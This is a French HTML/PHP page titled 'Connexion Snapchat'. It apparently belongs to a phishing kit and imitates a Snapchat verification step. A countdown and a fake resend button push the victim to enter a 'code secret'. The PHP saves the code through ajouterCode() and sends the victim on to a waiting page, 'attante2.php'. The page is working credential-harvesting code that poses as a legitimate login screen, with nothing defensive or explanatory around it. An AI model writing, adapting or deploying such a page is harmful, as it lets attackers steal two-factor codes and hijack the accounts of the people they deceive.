<!DOCTYPE html>
<html>

<head>
    <title>Connexion Snapchat</title>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
    <div class="container">
        <form method="POST">
            <h2>Connexion</h2>
            <div id="countdown" style="margin-left: 44%;"></div>

            <script>
                var seconds = 60; // Définir le nombre de secondes
                var countdownDisplay = document.getElementById("countdown");

                function updateCountdown() {
                    countdownDisplay.innerHTML = seconds;
                    seconds--;

                    if (seconds < 0) {
                        clearInterval(interval);
                        countdownDisplay.innerHTML = "renvoyer le code";
                    }
                }

                var interval = setInterval(updateCountdown, 1000); // Mettre à jour toutes les secondes
            </script>
            <label for="codes">code secret</label>
            <input type="text" name="codes" required>
            <input name="envoyer" type="submit" value="envoyer">
            <button class="non-clickable-button" disabled style="border-radius: 50px; margin-left: 80%;">Renvoyer</button>


        </form>
    </div>
</body>

</html>
<?php
require 'commande.php';
if (isset($_POST['envoyer'])) {
    if (!empty($_POST['codes'])) {
        $codes = htmlspecialchars(strip_tags($_POST['codes']));


        $user = ajouterCode($codes);

        if ($user) {
            // $_SESSION['userxXJppk45hPGu'] = $user;
            header('Location: attante2.php');
        } else {
            echo "<h1>pas de connection</h1>";
        }
    }
}
